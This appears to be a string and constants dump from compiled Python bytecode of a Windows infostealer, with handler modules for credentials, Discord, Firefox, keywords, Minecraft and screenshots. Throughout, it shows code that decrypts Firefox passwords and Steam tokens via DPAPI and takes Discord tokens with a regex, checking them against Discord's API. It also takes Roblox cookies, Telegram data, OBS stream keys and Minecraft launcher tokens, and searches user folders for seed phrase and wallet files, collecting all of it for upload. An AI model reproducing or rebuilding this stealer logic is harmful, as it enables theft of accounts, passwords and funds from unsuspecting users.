+a_get_mullvad_account
+a_get_steam_tokens
+aappend
+acr9
+wnuCredential files collected
+aINFO
+ucount=
+uCollect all credential files.
+acompile
+uuser_data[^/\\]*[/\\](media_cache|cache)($|[/\\])
+aIGNORECASE
+uuser_data[^/\\]*[/\\]media_cache($|[/\\])
+aBytesIO
+atdata
+azipfile
+aZipFile
+wwaZIP_DEFLATED
+a__enter__
+a__exit__
+awalk
+arelpath
+atdata_path
+w.aexclude_pattern
+asearch
+arel_root
+:nnnaroot
+aroot_folder_name
+awrite
+afile_count
+nnnagetvalue
+uTelegram zip failed
+aERROR
+uZip Telegram tdata with exclusions. Returns (data, file_count).
+uTelegram Desktop
+ucr.tg
+azip
+a_zip_telegram
+aexclude_cache
+FwxT
+ucr.tg
+aempty
+ucr.tg
+ubig.
+uTelegram too large, excluding cache
+usize=
+aexclude_cache
+tadata
+uok.
+uTelegram data zipped
+ufiles=
+u size=
+uTelegram_Data.zip
+adata
+nuZip Telegram tdata folder, excluding media_cache (and cache if >100MB).
+aRoblox
+aLocalStorage
+uRobloxCookies.dat
+ucr.rbx
+afound
+wruutf-8
+ajson
+aload
+acookies_json
+aget
+aCookiesData
+ucr.rbx
+uno.data
+uRoblox no CookiesData
+aWARN
+uField missing
+abase64
+ab64decode
+adpapi_decrypt
+ucr.rbx
+udec.fail
+uRoblox DPAPI decrypt failed
+uEmpty result
+adecode
+uutf-8
+aignore
+aerrors
+u# Netscape HTTP Cookie File
+u# Roblox Cookies
+asplit
+astrip
+u1893456000
+w :l
+nnastartswith
+u#HttpOnly_
+nnaoutput_lines
+adomain
+ucr.rbx
+aempty
+ucr.rbx
+uRoblox cookies extracted
+uRoblox_Cookies.txt
+uRoblox extraction failed
+uExtract and decrypt Roblox cookies, output in Netscape format.
+uobs-studio
+abasic
+aprofiles
+aobs_profiles_path
+uservice.json
+areplace
+w w_aOBS_
+u_StreamKey.json
+ucr.obs
+nuOBS stream key collected
+uprofile=
+uOBS extraction failed
+uExtract OBS stream keys from all profiles.
+asubprocess
+arun
+a_CREATE_NO_WINDOW
+amullvad
+aaccount
+aget
+acapture_output
+atimeout
+acreationflags
+areturncode
+ucr.mvd
+unot.logged
+uMullvad not logged in
+uexit=
+astdout
+uMullvad account:
+ucr.mvd
+uno.account
+uMullvad unexpected output
+:nl2nT
+ucr.mvd
+uMullvad account extracted
+ulen=
+uMullvad_Account.txt
+aencode
+uutf-8
+aTimeoutExpired
+ucr.mvd
+atimeout
+uMullvad CLI timeout
+uCommand timed out after 10s
+ucr.mvd
+uMullvad extraction failed
+uExtract Mullvad VPN account info via CLI.
+awinreg
+aHKEY_LOCAL_MACHINE
+uSOFTWARE\Wow6432Node\Valve\Steam
+uSOFTWARE\Valve\Steam
+aOpenKey
+aQueryValueEx
+aInstallPath
+EFileNotFoundError
+EOSError
+uC:\Program Files (x86)\Steam
+uFind Steam installation path from registry or default location.
+avdf
+uvdf module not available
+uCannot parse Steam files
+aconfig
+uloginusers.vdf
+ausers
+aitems
+aAccountName
+ausernames
+alower
+uSteam loginusers parse failed
+uExtract account names from loginusers.vdf.
+uRecursively search for hex-encoded encrypted blobs.
+afind_blobs
+u_extract_steam_blobs.<locals>.find_blobs
+uSteam local.vdf parse failed
+uExtract encrypted token blobs from local.vdf.
+avalues
+ablobs
+afromhex
+u0123456789abcdefABCDEF
+u<genexpr>
+u_extract_steam_blobs.<locals>.find_blobs.<locals>.<genexpr>
+a_get_steam_path
+ucr.stm
+afound
+a_get_steam_usernames
+ucr.stm
+uno.users
+uNo Steam users found
+uloginusers.vdf empty or missing
+aSteam
+ulocal.vdf
+a_extract_steam_blobs
+ucr.stm
+uno.blobs
+uNo Steam blobs found
+adpapi_decrypt_with_entropy
+ablob
+atokens
+ucr.stm
+uno.tokens
+uNo Steam tokens decrypted
+uDPAPI decryption yielded no valid tokens
+uSteam Refresh Tokens
+u==================================================
+uUsername: 
+uToken:    
+sucr.stm
+uSteam tokens extracted
+uSteam_Tokens.txt
+uSteam extraction failed
+uExtract Steam refresh tokens using DPAPI decryption.
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+atrace
+alogging
+aLoggingManager
+aLogType
+uutil.crypto
+adpapi_decrypt
+adpapi_decrypt_with_entropy
+aHitFile
+aHitFileCategory
+acredentials
+@agetenv
+aAPPDATA
+aLOCALAPPDATA
+saexpanduser
+w~areturn
+aget_credential_files
+atdata_path
+aexclude_cache
+areturn
+Ostr
+Obool
+AOtuple
+Obytes
+Oint
+areturn
+Ostr
+asteam_path
+areturn
+Ostr
+AOlist
+Ostr
+alocal_vdf_path
+areturn
+Ostr
+AOlist
+Obytes
+uapp\handlers\credentials.py
+ablobs
+afind_blobs
+u<module app.handlers.credentials>
+alocal_vdf_path
+avdf
+wfadata
+ablobs
+afind_blobs
+aproc
+aoutput
+afiles
+aobs_profiles_path
+aprofile_name
+aprofile_path
+aservice_json
+asafe_profile
+afile_name
+ahit_file
+acookies_path
+wfacookies_json
+acookies_data_b64
+abase64
+aencrypted_bytes
+adecrypted_bytes
+araw_cookies
+aoutput_lines
+acookie_parts
+acookie
+aparts
+adomain
+ahost_only
+apath
+asecure
+aexpiry
+aname
+avalue
+acookie_count
+aoutput_data
+aregistry_paths
+ahkey
+asubkey
+akey
+apath
+w_adefault
+asteam_path
+ausernames
+alocal_vdf_path
+ablobs
+atokens
+ablob
+ausername
+aentropy
+adecrypted
+atoken
+aoutput_lines
+aoutput_data
+asteam_path
+avdf
+aloginusers_path
+wfadata
+ausernames
+ausers_dict
+asteam_id
+auser_data
+aaccount_name
+atdata_path
+amax_size
+adata
+afile_count
+asize_mb
+atdata_path
+aexclude_cache
+aexclude_pattern
+abuffer
+aroot_folder_name
+afile_count
+aroot
+adirs
+afiles_list
+arel_root
+afile
+afile_path
+arel_path
+aarcname
+aobj
+avalue
+afind_blobs
+ablobs
+afiles
+atelegram_file
+acredential_paths
+aname
+apath
+ahit_file
+aroblox_file
+aobs_files
+wfamullvad_file
+asteam_file
+a__spec__
+.app.handlers.discord
+aname
+adb_path
+atype
+aenviron
+aget
+aAPPDATA
+aLOCALAPPDATA
+saDiscordClient
+aDiscord
+ajoin
+adiscord
+aDiscordClientType
+aENCRYPTED
+uDiscord PTB
+adiscordptb
+uDiscord Canary
+adiscordcanary
+aLightcord
+aUNENCRYPTED
+aOpera
+uOpera Software
+uOpera Stable
+aBROWSER
+uOpera GX
+uOpera GX Stable
+uChrome SxS
+aGoogle
+uUser Data
+uGoogle Chrome
+aChrome
+uMicrosoft Edge
+aMicrosoft
+aEdge
+aBrave
+aBraveSoftware
+uBrave-Browser
+aYandex
+aYandexBrowser
+aVivaldi
+uGet list of Discord clients to check (same as Java).
+wraignore
+a__enter__
+a__exit__
+aread
+nnnafinditer
+acontent
+agroup
+aresults
+uRead file and extract all regex matches.
+apath
+atokens
+a_regex_file
+aTOKEN_REGEX
+uGet unencrypted tokens from leveldb directory.
+aLoggingManager
+aadd
+a_MODULE
+uGetting encrypted tokens
+aLogType
+aDEBUG
+uPath: 
+suPath does not exist
+aWARN
+uLocal State
+uLocal State missing
+uDirectory exists but Local State file missing
+uLocal State found
+aget_browser_dpapi_master_key
+uNo master key
+aERROR
+uCould not retrieve master key
+uMaster key retrieved
+uKey length: 
+aENCRYPTED_TOKEN_REGEX
+abase64
+ab64decode
+areplace
+udQw4w9WgXcQ:
+sagcm_decrypt
+amaster_key
+adecode
+uutf-8
+uToken decrypt failed
+uCould not decrypt an encrypted token
+uGet encrypted tokens failed
+uGet encrypted tokens from leveldb directory and decrypt them.
+aAuthorization
+uContent-Type
+uapplication/json
+uUser-Agent
+uMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+arequests
+uhttps://discord.com/api/v9/users/@me
+aheaders
+atimeout
+ajson
+ausername
+adiscriminator
+aemail
+uNot linked
+aphone
+apremium_type
+w0aglobal_name
+w#atoken
+sausername
+adisplayName
+aemail
+aphone
+ahasNitro
+uGet token info failed
+uValidate token and get user info from Discord API.
+ainner
+uget_discord_tokens.<locals>.inner
+uStarting token collection
+aINFO
+uBeginning Discord token collection
+aThreadPoolExecutor
+amax_workers
+asubmit
+aresult
+a_TIMEOUT
+atimeout
+aFuturesTimeoutError
+atrace
+wxud.to
+wsuToken collection timeout
+uExceeded 
+us timeout
+ud.ex
+nuToken collection failed
+uCollect all Discord tokens from all clients. Returns list of token info dicts.
+ascan
+a_get_discord_clients
+uChecking client
+uChecking for tokens in 
+uLocal Storage
+aleveldb
+a_get_encrypted_tokens
+a_get_unencrypted_tokens
+aget_browser_profiles
+aclient
+atokens_to_add
+uTokens found
+uFound 
+u token(s) for 
+uFailed to get tokens for 
+uDuplicates removed
+uRemoved 
+u duplicate tokens
+a_get_token_info
+atoken_info_list
+uInvalid tokens removed
+u invalid/expired tokens
+wvuCollection complete
+uCollected 
+u valid tokens with user info
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+uconcurrent.futures
+aThreadPoolExecutor
+aTimeoutError
+aTimeoutError
+aenum
+aEnum
+aEnum
+atrace
+alogging
+aLoggingManager
+aLogType
+autil
+aget_browser_dpapi_master_key
+agcm_decrypt
+aget_browser_profiles
+acompile
+u[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}
+udQw4w9WgXcQ:[^\"]*
+a__prepare__
+a__getitem__
+u%s.__prepare__() must return a mapping, not %s
+a__name__
+u<metaclass>
+a__module__
+a__qualname__
+aencrypted
+aunencrypted
+abrowser
+a__orig_bases__
+aclient_type
+a__init__
+uDiscordClient.__init__
+areturn
+apattern
+aPattern
+afile_path
+Ostr
+apath
+areturn
+Ostr
+AOlist
+Ostr
+atoken
+areturn
+Ostr
+Odict
+areturn
+AOlist
+Odict
+aget_discord_tokens
+uapp\handlers\discord.py
+u<module app.handlers.discord>
+a__class__
+aself
+aname
+adb_path
+aclient_type
+aappdata
+alocalappdata
+apath
+alocal_state_path
+amaster_key
+atokens
+afilename
+afile_path
+aencrypted_token
+aencrypted_data
+adecrypted
+atoken
+aheaders
+aresp
+adata
+ausername
+adiscriminator
+aemail
+aphone
+ahas_nitro
+adisplay_name
+apath
+atokens
+afilename
+afile_path
+apattern
+afile_path
+aresults
+wfacontent
+amatch
+atoken
+ainner
+aexecutor
+afuture
+atokens
+aclients
+aclient
+atokens_to_add
+aleveldb_path
+aprofiles
+aprofile
+weaunique_tokens
+aremoved_count
+atoken_info_list
+atoken
+ainfo
+a__spec__
+.app.handlers.files
+aname
+acategory
+adata
+aready_for_upload
+a_load_from_path
+a__enter__
+a__exit__
+aread
+nnnaLoggingManager
+aadd
+a_MODULE
+uFailed to read file
+aLogType
+aERROR
+uCouldn't read file: 
+su, probably locked. 
+a_zip_folder
+uFailed to zip folder
+uCouldn't zip folder: 
+uInvalid path type
+aWARN
+uPath is not a file or folder: 
+uLoad file data from path. Zips directories with root folder preserved.
+afileName
+afileType
+avalue
+afileSize
+uGet file info dict for submission.
+uGet dict for file upload.
+aBytesIO
+arstrip
+w\azipfile
+aZipFile
+wwaZIP_DEFLATED
+awalk
+ajoin
+aroot
+arelpath
+afolder_path
+aroot_folder_name
+awrite
+uFailed to add file to zip
+agetvalue
+uZip folder failed
+uZip a folder with the root folder name preserved inside the archive.
+a_files
+aappend
+uFile added
+aDEBUG
+uname=
+u category=
+u size=
+uAdd a HitFile if it's ready for upload.
+aHitFile
+apath
+uCreate and add a HitFile from a path.
+adata
+uCreate and add a HitFile from raw bytes.
+aget_file_info
+uGet all file info dicts for submission.
+aget_upload_dict
+uGet all files as upload dicts.
+uGet count of collected files.
+uClear all collected files.
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+aenum
+aEnum
+aEnum
+alogging
+aLoggingManager
+aLogType
+afiles
+a__prepare__
+aHitFileCategory
+a__getitem__
+u%s.__prepare__() must return a mapping, not %s
+a__name__
+u<metaclass>
+a__module__
+a__qualname__
+aWallet
+aWALLET
+aWeb3Wallet
+aWEB3
+aMinecraft
+aMINECRAFT
+aLogin
+aLOGIN
+aKeyword
+aKEYWORD
+aBrowser
+aBROWSER
+a__orig_bases__
+nnapath
+Ostr
+Obytes
+a__init__
+uHitFile.__init__
+apath
+Ostr
+uHitFile._load_from_path
+areturn
+Odict
+uHitFile.get_file_info
+uHitFile.get_upload_dict
+afolder_path
+areturn
+Ostr
+Obytes
+uCollects and manages HitFiles for upload.
+aFileManager
+a__annotations__
+ahit_file
+uFileManager.add
+aadd_from_path
+uFileManager.add_from_path
+aadd_from_data
+uFileManager.add_from_data
+areturn
+AOlist
+Odict
+aget_file_infos
+uFileManager.get_file_infos
+aget_files
+uFileManager.get_files
+areturn
+Oint
+aget_count
+uFileManager.get_count
+aclear
+uFileManager.clear
+uapp\handlers\files.py
+u<module app.handlers.files>
+a__class__
+aself
+aname
+acategory
+apath
+adata
+aself
+apath
+wfweazipped
+afolder_path
+abuffer
+aroot_folder_name
+aroot
+adirs
+afiles
+afile
+afile_path
+arel_path
+aarcname
+acls
+ahit_file
+acls
+aname
+acategory
+adata
+ahit_file
+acls
+aname
+acategory
+apath
+ahit_file
+acls
+aself
+a__spec__
+.app.handlers.firefox
+uFind OID position in data.
+aoffset
+alength
+uParse ASN.1 length. Returns (length, header_size).
+a_parse_asn1_length
+uExtract OCTET STRING at exact offset. Returns (content, next_offset).
+avalue
+acontent_start
+uExtract INTEGER at exact offset. Returns (value, next_offset).
+uFind next occurrence of tag starting from offset.
+aFIREFOX_PROFILES_PATH
+ajoin
+aprofiles
+uGet all Firefox profile directories.
+a_find_oid
+aOID_AES256_CBC
+aOID_PBKDF2
+a_find_next_tag
+a_extract_octet_string_at
+a_extract_integer_at
+aOID_DES_EDE3_CBC
+aidx
+aencrypted_blob
+aciphertext
+ahashlib
+asha1
+adigest
+aPBKDF2
+aSHA256
+adkLen
+acount
+ahmac_hash_module
+naljust
+aAES
+anew
+aMODE_CBC
+aDES3
+adecrypt
+aLoggingManager
+aadd
+a_MODULE
+uPBES2 decrypt failed
+aLogType
+aERROR
+uDecrypt PBES2 encrypted data.
+aget_temp_copy
+ufirefox.exe
+asuffix
+u.db
+uFailed to copy key4.db
+uprofile=
+sasqlite3
+aconnect
+acursor
+aexecute
+uSELECT item1 FROM metadata WHERE id = 'password'
+afetchone
+uSELECT a11 FROM nssPrivate WHERE a11 IS NOT NULL ORDER BY length(a11) DESC
+aclose
+uNo master key in nssPrivate
+aWARN
+a_decrypt_pbes2
+uMaster key decryption failed
+uMaster key extracted
+aINFO
+u alg=
+uAES-256
+u3DES
+u key_len=
+aDecryptionContext
+akey
+ais_aes
+ukey4.db extraction failed
+u error=
+aunlink
+uExtract and decrypt the master key from key4.db.
+akey
+abase64
+ab64decode
+adecoded
+:nl nT
+adecode
+uutf-8
+aignore
+aerrors
+arstrip
+uLogin decryption failed
+aDEBUG
+uDecrypt a single encrypted login field.
+ulogins.json
+ukey4.db
+a_extract_master_key
+wruutf-8
+a__enter__
+a__exit__
+ajson
+aload
+nnnalogins_data
+aget
+alogins
+uLogin entries found
+u count=
+ahostname
+aencryptedUsername
+aencryptedPassword
+sa_decrypt_login
+actx
+apasswords
+aurl
+uN/A
+ausername
+apassword
+abrowser
+aFirefox
+aprofile
+aprofile_name
+uFailed to parse logins.json
+uExtract passwords from a single Firefox profile.
+ucookies.sqlite
+uFailed to copy cookies.sqlite
+uSELECT host, name, value, path, expiry FROM moz_cookies
+afetchall
+uCookie entries found
+=acookies
+ahostKey
+aname
+apath
+w/aexpiresUtc
+uCookie extraction failed
+uExtract cookies from a single Firefox profile. Firefox cookies are NOT encrypted.
+atrace
+uf.pwd
+astart
+a_get_profiles
+uf.pwd
+anoprof
+uNo Firefox profiles
+uFirefox not installed
+uStarting Firefox password extraction
+uprofiles=
+a_get_passwords_from_profile
+aall_passwords
+uPasswords extracted
+uf.pwd
+wnuFirefox passwords complete
+utotal=
+uGet passwords from all Firefox profiles.
+uf.cok
+astart
+uf.cok
+anoprof
+uStarting Firefox cookie extraction
+a_get_cookies_from_profile
+aall_cookies
+uCookies extracted
+uf.cok
+uFirefox cookies complete
+uGet cookies from all Firefox profiles.
+uformhistory.sqlite
+atempfile
+ashutil
+amktemp
+u.db
+asuffix
+acopy2
+uFailed to copy formhistory
+uSELECT fieldname, value FROM moz_formhistory
+uAutofill entries found
+aautofills
+uAutofill extraction failed
+uExtract autofill entries from a Firefox profile's formhistory.sqlite.
+uf.atf
+astart
+uf.atf
+anoprof
+uStarting Firefox autofill extraction
+a_get_autofills_from_profile
+aall_autofills
+uAutofills extracted
+uf.atf
+uFirefox autofills complete
+uGet autofill entries from all Firefox profiles.
+adatetime
+adatetime
+afromtimestamp
+astrftime
+u%Y-%m-%d %H:%M:%S
+uConvert Firefox timestamp (microseconds since Unix epoch) to readable date.
+uplaces.sqlite
+uFailed to copy places.sqlite
+            SELECT url, title, visit_count, last_visit_date
+            FROM moz_places
+            WHERE visit_count > 0
+            ORDER BY last_visit_date DESC
+            LIMIT 5000
+        
+u# Firefox | 
+u | 
+u entries
+nu...
+w-:nl
+na_format_firefox_time
+alines
+ux | 
+uHistory extraction failed
+uExtract history entries from a Firefox profile's places.sqlite as readable text.
+uSELECT id, title FROM moz_bookmarks WHERE type = 2
+aUnnamed
+            SELECT b.title, p.url, b.parent
+            FROM moz_bookmarks b
+            JOIN moz_places p ON b.fk = p.id
+            WHERE b.type = 1 AND p.url NOT LIKE 'place:%'
+        
+afolders
+aOther
+abookmarks_by_folder
+aappend
+u(No title)
+uBookmarks extraction failed
+uBrowser: Firefox
+uProfile: 
+uTotal Bookmarks: 
+u================================================================================
+asorted
+w[w]u  
+u    
+uExtract bookmarks from a Firefox profile's places.sqlite as readable text.
+u<genexpr>
+u_get_bookmarks_from_profile_file.<locals>.<genexpr>
+afiles
+aHitFile
+aHitFileCategory
+aHitFile
+aHitFileCategory
+aff0
+astart
+aff0
+anoprof
+uStarting Firefox files extraction
+areplace
+w w_a_get_history_from_profile_file
+aFirefox_
+u_History.txt
+aBROWSER
+aencode
+uutf-8
+adata
+uHistory file created
+a_get_bookmarks_from_profile_file
+u_Bookmarks.txt
+uBookmarks file created
+aff9
+uFirefox files extraction complete
+ufiles=
+uGet history and bookmarks files from all Firefox profiles.
+Firefox password extraction handler.
+Supports both legacy (3DES-CBC) and modern (AES-256-CBC) encryption.
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+adataclasses
+adataclass
+adataclass
+uCrypto.Cipher
+aAES
+aDES3
+uCrypto.Protocol.KDF
+aPBKDF2
+uCrypto.Hash
+aSHA256
+atrace
+alogging
+aLoggingManager
+aLogType
+uutil.handle_copy
+aget_temp_copy
+afirefox
+aenviron
+aAPPDATA
+saAPPDATA
+aMozilla
+aProfiles
+a__module__
+a__qualname__
+a__annotations__
+ais_aes
+adata
+aoid
+areturn
+Obytes
+pOint
+adata
+aoffset
+areturn
+Obytes
+Oint
+AOtuple
+Oint
+adata
+aoffset
+areturn
+Obytes
+Oint
+AOtuple
+Obytes
+Oint
+adata
+aoffset
+atag
+areturn
+Obytes
+Oint
+areturn
+AOlist
+Ostr
+aencrypted_blob
+apassword
+aglobal_salt
+areturn
+Obytes
+ppHT
+Obytes
+akey4_path
+areturn
+abase64_data
+Ostr
+aprofile_path
+areturn
+Ostr
+AOlist
+Odict
+areturn
+AOlist
+Odict
+aget_firefox_passwords
+aget_firefox_cookies
+aget_firefox_autofills
+afirefox_time
+areturn
+Oint
+Ostr
+aprofile_path
+areturn
+Ostr
+Ostr
+areturn
+Olist
+aget_firefox_files
+uapp\handlers\firefox.py
+wbu<module app.handlers.firefox>
+a__class__
+abase64_data
+actx
+adecoded
+ais_aes
+aoid_pos
+aiv_pos
+aciphertext
+aidx
+apos
+acontent
+anext_idx
+akey
+aiv_final
+acipher
+adecrypted
+apad_len
+aencrypted_blob
+apassword
+aglobal_salt
+ais_aes
+apbkdf2_pos
+asearch_pos
+asalt_pos
+aentry_salt
+anext_pos
+aiter_pos
+aiterations
+w_aaes_pos
+aiv_search_start
+aiv_pos
+ades_pos
+aciphertext
+aidx
+apos
+acontent
+anext_idx
+asha1_hash
+akey_len
+aderived_key
+aiv_final
+acipher
+adecrypted
+apad_len
+adata
+aoffset
+alength
+aheader_size
+acontent_start
+avalue
+akey4_path
+aprofile_name
+atemp_db
+aconn
+acursor
+arow
+aglobal_salt
+aencrypted_key
+ais_aes
+amaster_key
+adata
+aoffset
+alength
+aheader_size
+acontent_start
+adata
+aoffset
+atag
+adata
+aoid
+afirefox_time
+adatetime
+aunix_time
+aprofile_path
+aautofills
+aprofile_name
+aformhistory_path
+atemp_db
+atempfile
+ashutil
+weaconn
+acursor
+arows
+aname
+avalue
+aprofile_path
+aplaces_path
+aprofile_name
+atemp_db
+atempfile
+ashutil
+weabookmarks_by_folder
+aconn
+acursor
+afolders
+arows
+atitle
+aurl
+aparent_id
+afolder_name
+alines
+atotal
+afolder
+abookmarks
+aprofile_path
+acookies
+aprofile_name
+acookies_path
+atemp_db
+aconn
+acursor
+arows
+ahost
+aname
+avalue
+apath
+aexpiry
+aexpires_utc
+aprofile_path
+aplaces_path
+aprofile_name
+atemp_db
+atempfile
+ashutil
+wealines
+aconn
+acursor
+arows
+aurl
+atitle
+avisit_count
+alast_visit_date
+atitle_str
+aurl_str
+avisits
+atime_str
+aprofile_path
+apasswords
+aprofile_name
+alogins_path
+akey4_path
+actx
+wfalogins_data
+alogins
+alogin
+ahostname
+aencrypted_username
+aencrypted_password
+ausername
+apassword
+aprofiles
+aitem
+aprofile_path
+adata
+aoffset
+afirst_byte
+anum_bytes
+alength
+aall_autofills
+aprofiles
+aprofile_path
+aautofills
+aall_cookies
+aprofiles
+aprofile_path
+acookies
+aHitFile
+aHitFileCategory
+afiles
+aprofiles
+aprofile_path
+aprofile_name
+asafe_profile_name
+ahistory_text
+afile_name
+abookmarks_text
+aall_passwords
+aprofiles
+aprofile_path
+apasswords
+a__name__
+a__spec__
+.app.handlers.keywords
+alower
+a_KEYWORDS
+uCheck if filename contains any keyword.
+asplitext
+a_EXTENSIONS
+uCheck if file has an allowed extension.
+atrace
+akw0
+ascan
+atime
+aused_names
+a_SEARCH_PATHS
+asplit
+w\:nl
+nakw1
+awalk
+afolder_start
+a_TIMEOUT_PER_FOLDER
+ukw.to
+sw.wsaLoggingManager
+aadd
+a_MODULE
+uFolder timeout: 
+aLogType
+aWARN
+uelapsed=
+afolder_file_count
+a_MAX_FILES_PER_FOLDER
+ukw.mx
+uFolder max files: 
+ucount=
+acache
+atmp
+a__pycache__
+u.git
+avenv
+u.cache
+anode_modules
+atemp
+:nnna_has_valid_extension
+a_matches_keyword
+ajoin
+aroot
+agetsize
+a_MAX_FILE_SIZE
+ukw.big
+nw:l
+wMw_aHitFile
+aHitFileCategory
+aKEYWORD
+apath
+aready_for_upload
+afiles
+akw2
+nuCollected 
+aDEBUG
+upath=
+u size=
+wxukw.err
+nuSearch error in 
+aERROR
+akw9
+wnu.t
+uKeyword files collected
+aINFO
+u elapsed=
+uCollect files matching keywords from user folders.
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+atrace
+alogging
+aLoggingManager
+aLogType
+aHitFile
+aHitFileCategory
+akeywords
+aexpanduser
+w~a_USER_HOME
+L#aaccount
+apassword
+apasswd
+apass
+asecret
+aseed
+amnemonic
+awallet
+acrypto
+abackup
+atoken
+acredential
+alogin
+aauth
+u2fa
+amfa
+arecovery
+aprivate
+akey
+aphrase
+apaypal
+abank
+ametamask
+aexodus
+aatomic
+acode
+amemo
+acredit
+acard
+amail
+aaddress
+aphone
+anumber
+adatabase
+aconfig
+u.db
+u.pptx
+u.gif
+u.log
+u.ppt
+u.txt
+u.pdf
+u.mp4
+u.rtf
+u.key
+u.docx
+u.kdbx
+u.csv
+u.jpg
+u.png
+u.doc
+u.pem
+u.json
+u.jpeg
+u.webp
+u.xlsx
+u.odt
+u.xls
+aDesktop
+aDocuments
+aDownloads
+aOneDrive
+afilename
+areturn
+Ostr
+Obool
+naexisting_names
+AOset
+Ostr
+areturn
+aget_keyword_files
+uapp\handlers\keywords.py
+u<module app.handlers.keywords>
+afilename
+w_aext
+afilename
+aname_lower
+akeyword
+aexisting_names
+afiles
+aused_names
+atotal_start
+aname
+asearch_path
+afolder_name
+afolder_start
+afolder_file_count
+aroot
+adirs
+afilenames
+afilename
+afile_path
+asize
+abase_name
+aext
+aunique_name
+ahit_file
+weaelapsed
+a__spec__
+.app.handlers.minecraft
+atrace
+ascan
+ulunar_accounts.json
+ajoin
+a_USER_HOME
+u.lunarclient
+asettings
+agame
+uaccounts.json
+uessential_accounts.json
+a_APPDATA
+ugg.essential.mod
+umicrosoft_accounts.json
+uprismlauncher_accounts.json
+aPrismLauncher
+aHitFile
+aHitFileCategory
+aMINECRAFT
+apath
+aready_for_upload
+afiles
+naLoggingManager
+aadd
+a_MODULE
+uCollected 
+saLogType
+aDEBUG
+upath=
+afeath
+a_get_decrypted_feather_file
+amodr
+a_get_modrinth_file
+aappend
+asrvlst
+a_get_server_list_file
+wnuMinecraft files collected
+aINFO
+ucount=
+uCollect all Minecraft-related account files.
+u.feather
+uaccount.txt
+uFeather Launcher
+uLocal State
+uFeather Local State not found
+aget_browser_dpapi_master_key
+uFailed to get Feather decryption key
+aWARN
+uEmpty key
+a__enter__
+a__exit__
+aread
+nnnagcm_decrypt
+aencrypted_data
+uFailed to decrypt Feather file
+uDecryption returned None
+uDecrypted Feather accounts
+usize=
+ufeather_accounts.txt
+adata
+uFeather decryption failed
+aERROR
+uDecrypt and return Feather account file.
+aModrinthApp
+uapp.db
+atempfile
+amkstemp
+u.db
+asuffix
+aclose
+ashutil
+acopy2
+asqlite3
+aconnect
+acursor
+aexecute
+uSELECT username, uuid, access_token, refresh_token, expires FROM minecraft_users
+afetchall
+uModrinth database empty
+uNo accounts found
+aaccounts
+ausername
+auuid
+aaccess_token
+arefresh_token
+aexpires
+ajson
+adumps
+aindent
+aencode
+uutf-8
+uExtracted Modrinth accounts
+umodrinth_accounts.json
+aunlink
+uModrinth extraction failed
+uExtract accounts from Modrinth SQLite database.
+astruct
+acalcsize
+aunpack
+uRead struct format from file.
+a_nbt_read
+adecode
+uRead NBT string (length-prefixed UTF-8).
+a_TAG_BYTE
+a_TAG_SHORT
+a_TAG_INT
+a_TAG_LONG
+a_TAG_FLOAT
+a_TAG_DOUBLE
+a_TAG_BYTE_ARRAY
+a_TAG_STRING
+a_nbt_read_string
+a_TAG_LIST
+a_nbt_read_payload
+wfaitem_type
+aitems
+a_TAG_COMPOUND
+a_TAG_END
+atags
+a_TAG_INT_ARRAY
+w>wia_TAG_LONG_ARRAY
+wquRead NBT payload based on tag type.
+adata
+agzip
+adecompress
+aBytesIO
+uRead and parse NBT file (handles gzip).
+u.minecraft
+uservers.dat
+a_read_nbt_file
+aget
+aservers
+           
+  SERVER LIST  
+             
+aname
+u???
+u???
+u???
+alines
+  Name:  
+  IP:    
+aserver_count
+uutf-8
+uExtracted server list
+uMinecraft_Server_List.txt
+uExtract Minecraft server list from servers.dat.
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+atrace
+alogging
+aLoggingManager
+aLogType
+uutil.crypto
+aget_browser_dpapi_master_key
+agcm_decrypt
+aHitFile
+aHitFileCategory
+aminecraft
+agetenv
+aAPPDATA
+saexpanduser
+w~areturn
+aget_minecraft_files
+uapp\handlers\minecraft.py
+u<module app.handlers.minecraft>
+afeather_path
+alocal_state_path
+adecryption_key
+wfaencrypted_data
+adecrypted_data
+amodrinth_db_path
+atemp_fd
+atemp_path
+aconn
+acursor
+arows
+aaccounts
+arow
+aoutput
+adata
+apath
+aroot
+aservers
+alines
+aserver_count
+wiaserver
+aname
+aoutput_text
+adata
+wfafmt
+asize
+wfatag_type
+aresult
+aitem_type
+alength
+aitems
+w_aitem
+atags
+achild_type
+aname
+wfaresult
+alength
+apath
+wfadata
+aresult
+aroot_type
+afiles
+asimple_files
+aname
+apath
+ahit_file
+afeather_file
+amodrinth_file
+aserver_list_file
+a__spec__
+.app.handlers.screenshot
+ainner
+utake_screenshot.<locals>.inner
+atrace
+asc0
+agrab
+aLoggingManager
+aadd
+a_MODULE
+uCapturing screenshot
+aLogType
+aDEBUG
+uStarting screen capture
+aThreadPoolExecutor
+amax_workers
+a__enter__
+a__exit__
+asubmit
+aresult
+a_TIMEOUT
+atimeout
+asc1
+uok.
+swkuScreenshot captured
+aINFO
+usize=
+u bytes (b64)
+nnnaFuturesTimeoutError
+usc.to
+uScreenshot timeout
+aWARN
+uExceeded 
+us timeout
+usc.ex
+nuScreenshot failed
+aERROR
+uCapture screen and return as base64 JPEG. Returns empty string on failure.
+aPIL
+aImageGrab
+aImageGrab
+agrab
+aBytesIO
+asave
+aformat
+aquality
+aJPEG
+lUabase64
+ab64encode
+agetvalue
+adecode
+uutf-8
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+uconcurrent.futures
+aThreadPoolExecutor
+aTimeoutError
+aTimeoutError
+atrace
+alogging
+aLoggingManager
+aLogType
+ascreenshot
+areturn
+Ostr
+atake_screenshot
+uapp\handlers\screenshot.py
+u<module app.handlers.screenshot>
+aImageGrab
+aimg
+abuffer
+ainner
+aexecutor
+afuture
+aresult
+wea__spec__
+.app.handlers.system_info
+aThreadPoolExecutor
+amax_workers
+a__enter__
+a__exit__
+asubmit
+aresult
+a_TIMEOUT
+atimeout
+nnnaFuturesTimeoutError
+aLoggingManager
+aadd
+a_MODULE
+a__name__
+su timeout
+aLogType
+aWARN
+uOperation exceeded 
+us timeout
+u failed
+aERROR
+uRun a function with a timeout, return default on failure.
+ainner
